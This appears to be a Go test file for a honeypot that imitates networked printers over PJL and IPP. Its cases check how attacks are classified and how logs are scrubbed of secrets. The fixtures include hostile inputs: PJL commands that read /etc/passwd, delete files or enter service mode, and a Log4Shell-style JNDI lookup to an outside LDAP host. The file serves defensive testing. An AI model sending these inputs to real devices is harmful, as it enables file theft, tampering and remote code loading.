@@ -1,0 +1,526 @@
+package trap
+
+import (
+	"bytes"
+	"encoding/binary"
+	"io"
+	"net"
+	"net/http"
+	"strconv"
+	"strings"
+	"testing"
+	"time"
+	"unicode/utf8"
+
+	"github.com/st0o0/ran/internal/alert"
+)
+
+// ---- PJL ----
+
+// pjlExchange sends data, half-closes the connection and returns everything the
+// trap answered.
+func pjlExchange(t *testing.T, addr string, data []byte) string {
+	t.Helper()
+	conn := dialTrap(t, addr)
+	if _, err := conn.Write(data); err != nil {
+		t.Fatal(err)
+	}
+	if tc, ok := conn.(*net.TCPConn); ok {
+		_ = tc.CloseWrite()
+	}
+	out, err := io.ReadAll(conn)
+	if err != nil {
+		// The trap may reset a connection with unread input once it stops reading.
+		t.Logf("read: %v", err)
+	}
+	return string(out)
+}
+
+func TestPJLProbeCommands(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"info id", "@PJL INFO ID\r\n", "\"" + pjlModel + "\""},
+		{"info id lowercase", "@pjl info id\n", pjlModel},
+		{"info status", "@PJL INFO STATUS\r\n", "CODE=10001"},
+		{"info config", "@PJL INFO CONFIG\r\n", pjlSerial},
+		{"info variables", "@PJL INFO VARIABLES\r\n", "COPIES=1"},
+		{"info ustatus", "@PJL INFO USTATUS\r\n", "@PJL USTATUS DEVICE"},
+		{"ustatus", "@PJL USTATUS DEVICE=ON\r\n", "@PJL USTATUS DEVICE"},
+		{"unknown info category", "@PJL INFO NOSUCHTHING\r\n", "@PJL INFO\r\n?"},
+		{"with UEL", "\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X", pjlModel},
+		{"echo", "@PJL ECHO MARKERXYZ\r\n", "@PJL ECHO\r\n\f"},
+		{"job framing", "@PJL JOB NAME=\"x\"\r\n@PJL EOJ\r\n@PJL INFO ID\r\n", pjlModel},
+		{"inquire", "@PJL INQUIRE MARKERXYZ\r\n", "@PJL INQUIRE\r\n?"},
+		{"no final newline", "@PJL INFO ID", pjlModel},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			it := startICS(t, "pjl", buildPJL)
+			out := pjlExchange(t, it.addr, []byte(tc.in))
+			if !strings.Contains(out, tc.want) {
+				t.Errorf("response %q lacks %q", out, tc.want)
+			}
+			if !strings.HasSuffix(out, "\f") {
+				t.Errorf("response %q does not end with a form feed", out)
+			}
+			if strings.Contains(out, "MARKERXYZ") {
+				t.Errorf("response reflects client text: %q", out)
+			}
+			if got := it.sink.waitOutcome(t); got != alert.ClassProbe {
+				t.Errorf("class = %s, want probe", got)
+			}
+			if hasClass(it.sink.snapshot(), alert.ClassAttack) {
+				t.Error("probe command produced an attack")
+			}
+		})
+	}
+}
+
+func TestPJLAttackCommands(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name string
+		in   string
+		kind string
+		resp string
+	}{
+		{"fsdir", "@PJL FSDIR NAME=\"0:\\\\\" ENTRY=1 COUNT=65535\r\n", pjlKindFS, "@PJL FSDIR FILEERROR=3"},
+		{"fsupload", "@PJL FSUPLOAD NAME=\"0:\\\\etc\\\\passwd\"\r\n", pjlKindFS, "@PJL FSUPLOAD FILEERROR=3"},
+		{"fsdownload", "@PJL FSDOWNLOAD FORMAT:BINARY SIZE=4 NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSDOWNLOAD FILEERROR=3"},
+		{"fsdelete", "@PJL FSDELETE NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSDELETE FILEERROR=3"},
+		{"fsmkdir", "@PJL FSMKDIR NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSMKDIR FILEERROR=3"},
+		{"set", "@PJL SET SERVICEMODE=HPBOOT\r\n", pjlKindSet, "@PJL SET ?"},
+		{"default", "@PJL DEFAULT COPIES=9\r\n", pjlKindSet, "@PJL DEFAULT ?"},
+		{"opmsg", "@PJL OPMSG DISPLAY=\"hi\"\r\n", pjlKindSet, "@PJL OPMSG ?"},
+		{"unknown command", "@PJL NOSUCHVERB X\r\n", pjlKindOther, "@PJL ?"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			it := startICS(t, "pjl", buildPJL)
+			out := pjlExchange(t, it.addr, []byte("\x1b%-12345X"+tc.in))
+			if !strings.Contains(out, tc.resp) {
+				t.Errorf("response %q lacks %q", out, tc.resp)
+			}
+			ev := waitAttack(t, it.sink)
+			assertMetaKeys(t, ev, "kind", "command")
+			if ev.Meta["kind"] != tc.kind {
+				t.Errorf("kind = %q, want %q", ev.Meta["kind"], tc.kind)
+			}
+			if !strings.HasPrefix(strings.ToUpper(ev.Meta["command"]), "@PJL") {
+				t.Errorf("command meta = %q", ev.Meta["command"])
+			}
+			if ev.Info.Commands == 0 {
+				t.Errorf("info = %+v, want a command", ev.Info)
+			}
+		})
+	}
+}
+
+func TestPJLCommandMetaScrubsSecrets(t *testing.T) {
+	t.Parallel()
+	it := startICS(t, "pjl", buildPJL)
+	pjlExchange(t, it.addr, []byte("@PJL SET PASSWORD=hunter2topsecret\r\n"))
+	ev := waitAttack(t, it.sink)
+	if strings.Contains(ev.Meta["command"], "hunter2") {
+		t.Errorf("secret in meta: %q", ev.Meta["command"])
+	}
+	waitUntil(t, func() bool { return strings.Contains(it.logs.String(), `"action":"command"`) })
+	if strings.Contains(it.logs.String(), "hunter2") {
+		t.Errorf("secret in log:\n%s", it.logs.String())
+	}
+}
+
+func TestPJLPrintData(t *testing.T) {
+	t.Parallel()
+	it := startICS(t, "pjl", buildPJL)
+	data := append([]byte("\x1b%-12345X@PJL ENTER LANGUAGE=POSTSCRIPT\r\n%!PS-Adobe-3.0\r\n"), bytes.Repeat([]byte("A"), 5000)...)
+	data = append(data, "\x00\x01\x02password=hunter2zz"...)
+	pjlExchange(t, it.addr, data)
+
+	ev := waitAttack(t, it.sink)
+	assertMetaKeys(t, ev, "kind", "data_bytes", "data_hash")
+	if ev.Meta["kind"] != pjlKindPrintData || len(ev.Meta["data_hash"]) != pjlHashHexLen {
+		t.Errorf("meta = %v", ev.Meta)
+	}
+	if ev.Info.PayloadBytes < 5000 {
+		t.Errorf("payload bytes = %d, want the print data size", ev.Info.PayloadBytes)
+	}
+	waitUntil(t, func() bool { return strings.Contains(it.logs.String(), `"payload_type":"pjl_data"`) })
+	logs := it.logs.String()
+	if strings.Contains(logs, "hunter2") {
+		t.Errorf("secret from print data in log")
+	}
+	if strings.Contains(logs, strings.Repeat("A", pjlSampleBytes+1)) {
+		t.Error("sample longer than the limit in log")
+	}
+	if !strings.Contains(logs, strings.Repeat("A", 20)) || strings.Contains(logs, "\\u0000") {
+		t.Errorf("sample should be printable text:\n%s", logs)
+	}
+}
+
+func TestPJLReadLimits(t *testing.T) {
+	t.Parallel()
+	t.Run("total bytes", func(t *testing.T) {
+		t.Parallel()
+		it := startICS(t, "pjl", buildPJL)
+		conn := dialTrap(t, it.addr)
+		go func() {
+			chunk := bytes.Repeat([]byte("B"), 4096)
+			for range 64 {
+				if _, err := conn.Write(chunk); err != nil {
+					return
+				}
+			}
+		}()
+		_, _ = io.Copy(io.Discard, conn)
+		it.waitOutcomeLabel(t, "pjl", outcomeTooLong)
+		ev := waitAttack(t, it.sink)
+		assertMetaKeys(t, ev, "kind", "data_bytes", "data_hash")
+	})
+	t.Run("command count", func(t *testing.T) {
+		t.Parallel()
+		it := startICS(t, "pjl", buildPJL)
+		pjlExchange(t, it.addr, bytes.Repeat([]byte("@PJL INFO ID\r\n"), pjlMaxEvents+20))
+		it.waitOutcomeLabel(t, "pjl", "completed")
+		// Server side count: a reset connection can drop answers the client already got.
+		if n := strings.Count(it.logs.String(), `"msg":"pjl_request"`); n != pjlMaxEvents {
+			t.Errorf("served %d commands, want %d", n, pjlMaxEvents)
+		}
+	})
+	t.Run("long line is split into chunks", func(t *testing.T) {
+		t.Parallel()
+		it := startICS(t, "pjl", buildPJL)
+		out := pjlExchange(t, it.addr, append([]byte("@PJL FSDIR NAME=\""), bytes.Repeat([]byte("x"), 3000)...))
+		if !strings.Contains(out, "FILEERROR") {
+			t.Errorf("response = %q", out)
+		}
+		ev := waitAttack(t, it.sink)
+		if len(ev.Meta["command"]) > 256 {
+			t.Errorf("command meta is %d bytes", len(ev.Meta["command"]))
+		}
+	})
+}
+
+func TestPJLStopClosesConnection(t *testing.T) {
+	t.Parallel()
+	it := startICS(t, "pjl", buildPJL)
+	conn := dialTrap(t, it.addr)
+	_, _ = conn.Write([]byte("@PJL INFO ID\r\n"))
+	buf := make([]byte, 64)
+	if _, err := conn.Read(buf); err != nil {
+		t.Fatal(err)
+	}
+	assertStopClosesConn(t, it, conn)
+}
+
+func TestPrintableSample(t *testing.T) {
+	t.Parallel()
+	if got := printableSample([]byte("ab\x00\xffc\n"), 4); got != "ab.." {
+		t.Errorf("sample = %q", got)
+	}
+	if got := printableSample(nil, 4); got != "" {
+		t.Errorf("sample = %q", got)
+	}
+}
+
+// ---- IPP ----
+
+// ippBody builds an IPP request. attrs are appended to the operation attributes
+// group; doc follows the end-of-attributes tag.
+func ippBody(op uint16, requestID uint32, jobName string, doc []byte) []byte {
+	b := []byte{2, 0}
+	b = binary.BigEndian.AppendUint16(b, op)
+	b = binary.BigEndian.AppendUint32(b, requestID)
+	w := &ippWriter{b: []byte{ippTagOperationAttrs}}
+	w.str(0x47, "attributes-charset", "utf-8")
+	w.str(0x48, "attributes-natural-language", "en")
+	w.str(0x45, "printer-uri", "ipp://MARKERHOST/ipp/print")
+	if jobName != "" {
+		w.str(0x42, "job-name", jobName)
+	}
+	b = append(b, w.b...)
+	b = append(b, ippTagEnd)
+	return append(b, doc...)
+}
+
+func startIPP(t *testing.T) *stubHarness {
+	return startStub(t, "ipp", buildIPP)
+}
+
+func ippPost(t *testing.T, h *stubHarness, path string, body []byte, headers map[string]string) stubResult {
+	t.Helper()
+	hd := map[string]string{"Content-Type": "application/ipp", "User-Agent": "cups/2.4"}
+	for k, v := range headers {
+		hd[k] = v
+	}
+	return stubDo(t, h.addr, "POST", path, hd, string(body))
+}
+
+func ippStatus(t *testing.T, res stubResult) uint16 {
+	t.Helper()
+	if res.status != http.StatusOK || res.header.Get("Content-Type") != "application/ipp" {
+		t.Fatalf("http status %d, content type %q", res.status, res.header.Get("Content-Type"))
+	}
+	if len(res.body) < 9 {
+		t.Fatalf("short IPP response: %x", res.body)
+	}
+	return binary.BigEndian.Uint16([]byte(res.body[2:4]))
+}
+
+func TestIPPProbeOperations(t *testing.T) {
+	t.Parallel()
+	for _, op := range []uint16{ippOpGetPrinterAttrs, ippOpGetJobs, ippOpValidateJob, ippOpCUPSGetPrinters, ippOpCUPSGetDefault} {
+		t.Run(ippOpName(op), func(t *testing.T) {
+			t.Parallel()
+			h := startIPP(t)
+			res := ippPost(t, h, "/printers/MARKERPATH", ippBody(op, 0x01020304, "", nil), map[string]string{
+				"X-Forwarded-For": "1.1.1.1",
+				"Host":            "evil.example.invalid:631",
+			})
+			if st := ippStatus(t, res); st != ippStatusOK {
+				t.Errorf("status = 0x%04x", st)
+			}
+			b := []byte(res.body)
+			if binary.BigEndian.Uint32(b[4:8]) != 0x01020304 || b[0] != 2 || b[1] != 0 {
+				t.Errorf("version or request id wrong: %x", b[:8])
+			}
+			// The response must parse as IPP: groups and end tag.
+			if _, err := parseIPP(b); err != nil {
+				t.Errorf("response is not valid IPP: %v", err)
+			}
+			hasAttrs := op == ippOpGetPrinterAttrs || op == ippOpCUPSGetPrinters || op == ippOpCUPSGetDefault
+			if got := bytes.Contains(b, []byte(ippPrinterModel)); got != hasAttrs {
+				t.Errorf("printer attributes present = %v, want %v", got, hasAttrs)
+			}
+			for _, bad := range []string{"MARKERHOST", "MARKERPATH", "evil.example", "1.1.1.1", "cups/2.4"} {
+				if bytes.Contains(b, []byte(bad)) || strings.Contains(res.header.Get("Server"), bad) {
+					t.Errorf("response reflects client data %q", bad)
+				}
+			}
+			ev := h.waitClass(t, false)
+			if ev.Class != alert.ClassProbe {
+				t.Errorf("class = %s", ev.Class)
+			}
+		})
+	}
+}
+
+func TestIPPPrinterAttributesContent(t *testing.T) {
+	t.Parallel()
+	h := startIPP(t)
+	res := ippPost(t, h, "/ipp/print", ippBody(ippOpGetPrinterAttrs, 7, "", nil), nil)
+	ippStatus(t, res)
+	b := []byte(res.body)
+	for _, want := range []string{"printer-name", "printer-make-and-model", "printer-state", "printer-uri-supported", ippPrinterURI, "printer-is-accepting-jobs", "ipp-versions-supported"} {
+		if !bytes.Contains(b, []byte(want)) {
+			t.Errorf("response lacks %q", want)
+		}
+	}
+	// printer-state: enum tag, name, 4 byte value 3 (idle).
+	state := append(append([]byte{0x23, 0, 13}, "printer-state"...), 0, 4, 0, 0, 0, ippPrinterState)
+	if !bytes.Contains(b, state) {
+		t.Error("printer-state idle attribute missing")
+	}
+}
+
+func TestIPPPrintJobIsCommand(t *testing.T) {
+	t.Parallel()
+	doc := bytes.Repeat([]byte("DOCSECRETBYTES"), 2000)
+	cases := []struct {
+		name   string
+		op     uint16
+		status uint16
+		kind   string
+	}{
+		{"print job", ippOpPrintJob, ippStatusNotAuthorized, ippKindPrintJob},
+		{"create job", ippOpCreateJob, ippStatusNotAuthorized, ippKindPrintJob},
+		{"send document", ippOpSendDocument, ippStatusNotAuthorized, ippKindPrintJob},
+		{"cancel job", ippOpCancelJob, ippStatusOperationNotSupp, ippKindOther},
+		{"unknown op", 0x7777, ippStatusOperationNotSupp, ippKindOther},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			h := startIPP(t)
+			res := ippPost(t, h, "/ipp/print", ippBody(tc.op, 99, "report.pdf", doc), map[string]string{"X-Forwarded-For": "1.1.1.1"})
+			if st := ippStatus(t, res); st != tc.status {
+				t.Errorf("status = 0x%04x, want 0x%04x", st, tc.status)
+			}
+			ev := waitAttack(t, h.sink)
+			assertMetaKeys(t, ev, "path", "method", "user_agent", "command", "kind", "operation", "job_name", "document_bytes")
+			if ev.Meta["kind"] != tc.kind || ev.Meta["job_name"] != "report.pdf" {
+				t.Errorf("meta = %v", ev.Meta)
+			}
+			if ev.Meta["document_bytes"] != "28000" {
+				t.Errorf("document_bytes = %q, want 28000", ev.Meta["document_bytes"])
+			}
+			if ev.Info.SourceIP != "127.0.0.1" {
+				t.Errorf("source ip = %q, want the socket peer", ev.Info.SourceIP)
+			}
+			waitUntil(t, func() bool { return strings.Contains(h.logs.String(), `"claimed_client_ip":"1.1.1.1"`) })
+			if strings.Contains(h.logs.String(), "DOCSECRET") {
+				t.Error("document bytes in log")
+			}
+			for k, v := range ev.Meta {
+				if strings.Contains(v, "DOCSECRET") {
+					t.Errorf("document bytes in meta %s", k)
+				}
+			}
+		})
+	}
+}
+
+func TestIPPJobNameSanitized(t *testing.T) {
+	t.Parallel()
+	h := startIPP(t)
+	name := "pw=1\x1b[31m" + strings.Repeat("n", 300) + "\xff"
+	ippPost(t, h, "/", ippBody(ippOpPrintJob, 1, name, nil), nil)
+	ev := waitAttack(t, h.sink)
+	if len(ev.Meta["job_name"]) > ippMaxJobName || strings.ContainsAny(ev.Meta["job_name"], "\x1b") || !utf8.ValidString(ev.Meta["job_name"]) {
+		t.Errorf("job_name = %q", ev.Meta["job_name"])
+	}
+	h2 := startIPP(t)
+	ippPost(t, h2, "/", ippBody(ippOpPrintJob, 1, "password=hunter2", nil), nil)
+	ev = waitAttack(t, h2.sink)
+	if strings.Contains(ev.Meta["job_name"], "hunter2") || strings.Contains(ev.Meta["command"], "hunter2") {
+		t.Errorf("secret in meta: %v", ev.Meta)
+	}
+	waitUntil(t, func() bool { return strings.Contains(h2.logs.String(), `"action":"command"`) })
+	if strings.Contains(h2.logs.String(), "hunter2") {
+		t.Error("secret in log")
+	}
+}
+
+func TestIPPNonIPPRequests(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name   string
+		method string
+		path   string
+		body   string
+		status int
+		attack bool
+	}{
+		{"home page", "GET", "/", "", 200, false},
+		{"printers page", "GET", "/printers/x", "", 200, false},
+		{"head", "HEAD", "/", "", 200, false},
+		{"options unknown path", "OPTIONS", "/nothing", "", 404, false},
+		{"unknown path", "GET", "/nothing", "", 404, false},
+		{"get with body", "GET", "/", "x=1", 200, true},
+		{"put", "PUT", "/ipp/print", "x", 405, true},
+		{"delete", "DELETE", "/", "", 405, true},
+		{"post not ipp", "POST", "/ipp/print", "hello", 400, true},
+		{"post empty", "POST", "/", "", 400, true},
+		{"truncated header", "POST", "/", "\x02\x00\x00\x0b", 400, true},
+		{"bad version", "POST", "/", "\x09\x09\x00\x0b\x00\x00\x00\x01\x03", 400, true},
+		{"name length past end", "POST", "/", "\x02\x00\x00\x0b\x00\x00\x00\x01\x01\x47\xff\xff", 400, true},
+		{"no end tag", "POST", "/", "\x02\x00\x00\x0b\x00\x00\x00\x01\x01", 400, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			h := startIPP(t)
+			res := stubDo(t, h.addr, tc.method, tc.path, map[string]string{"User-Agent": "scanner"}, tc.body)
+			if res.status != tc.status {
+				t.Errorf("status = %d, want %d", res.status, tc.status)
+			}
+			ev := h.waitClass(t, tc.attack)
+			if tc.attack {
+				keys := []string{"path", "method", "user_agent", "command", "kind"}
+				if tc.name == "get with body" {
+					keys = keys[:3]
+					keys = append(keys, "kind")
+				}
+				assertMetaKeys(t, ev, keys...)
+			}
+		})
+	}
+}
+
+func TestIPPOptionsStatus(t *testing.T) {
+	t.Parallel()
+	// OPTIONS on a known path answers 200 like GET and HEAD.
+	h := startIPP(t)
+	res := stubDo(t, h.addr, "OPTIONS", "/ipp/print", nil, "")
+	if res.status != 200 {
+		t.Errorf("status = %d", res.status)
+	}
+	h.waitClass(t, false)
+}
+
+func TestIPPJNDIIsCommand(t *testing.T) {
+	t.Parallel()
+	h := startIPP(t)
+	res := ippPost(t, h, "/ipp/print", ippBody(ippOpGetPrinterAttrs, 1, "", nil), map[string]string{"User-Agent": "${jndi:ldap://8.8.8.8/a}"})
+	ippStatus(t, res)
+	ev := waitAttack(t, h.sink)
+	if ev.Meta["kind"] != ippKindAttributes {
+		t.Errorf("meta = %v", ev.Meta)
+	}
+}
+
+func TestIPPStopClosesConnections(t *testing.T) {
+	t.Parallel()
+	h := startIPP(t)
+	assertStopClosesConnections(t, h, "GET / HTTP/1.1\r\nHost: x\r\n\r\n")
+}
+
+func TestParseIPPTable(t *testing.T) {
+	t.Parallel()
+	good := ippBody(ippOpPrintJob, 5, "job", []byte("doc"))
+	req, err := parseIPP(good)
+	if err != nil || req.operation != ippOpPrintJob || req.requestID != 5 || req.jobName != "job" || req.docOffset != len(good)-3 {
+		t.Fatalf("req = %+v, err = %v", req, err)
+	}
+	// Attribute limit: more attributes than ippMaxAttrs still parse, and the
+	// job name placed after the limit is not read.
+	w := &ippWriter{b: []byte{2, 0, 0, 2, 0, 0, 0, 1, ippTagOperationAttrs}}
+	for range ippMaxAttrs {
+		w.str(0x44, "a", "b")
+	}
+	w.str(0x42, "job-name", "late")
+	req, err = parseIPP(append(w.b, ippTagEnd))
+	if err != nil || req.jobName != "" {
+		t.Errorf("req = %+v, err = %v", req, err)
+	}
+	// Additional values keep the previous name.
+	w = &ippWriter{b: []byte{1, 1, 0, 2, 0, 0, 0, 1, ippTagOperationAttrs}}
+	w.str(0x42, "job-name", "first")
+	w.str(0x42, "", "second")
+	if req, err = parseIPP(append(w.b, ippTagEnd)); err != nil || req.jobName != "first" || req.docOffset != -1 {
+		t.Errorf("req = %+v, err = %v", req, err)
+	}
+	for _, bad := range [][]byte{nil, good[:8], {3, 0, 0, 2, 0, 0, 0, 1, 3}, good[:len(good)-4]} {
+		if _, err := parseIPP(bad); err == nil && len(bad) < len(good)-3 {
+			t.Errorf("parse of %x succeeded", bad)
+		}
+	}
+}
+
+func TestIPPSessionPerConnection(t *testing.T) {
+	t.Parallel()
+	h := startIPP(t)
+	conn, err := net.DialTimeout("tcp", h.addr, 2*time.Second)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
+	body := ippBody(ippOpGetPrinterAttrs, 1, "", nil)
+	req := "POST /ipp/print HTTP/1.1\r\nHost: x\r\nContent-Type: application/ipp\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n\r\n" + string(body)
+	// Two requests on one connection share one session and stay a single probe.
+	_, _ = io.WriteString(conn, req+req)
+	buf := make([]byte, 64)
+	_, _ = conn.Read(buf)
+	conn.Close()
+	ev := h.waitClass(t, false)
+	if ev.Class != alert.ClassProbe {
+		t.Errorf("class = %s", ev.Class)
+	}
+}
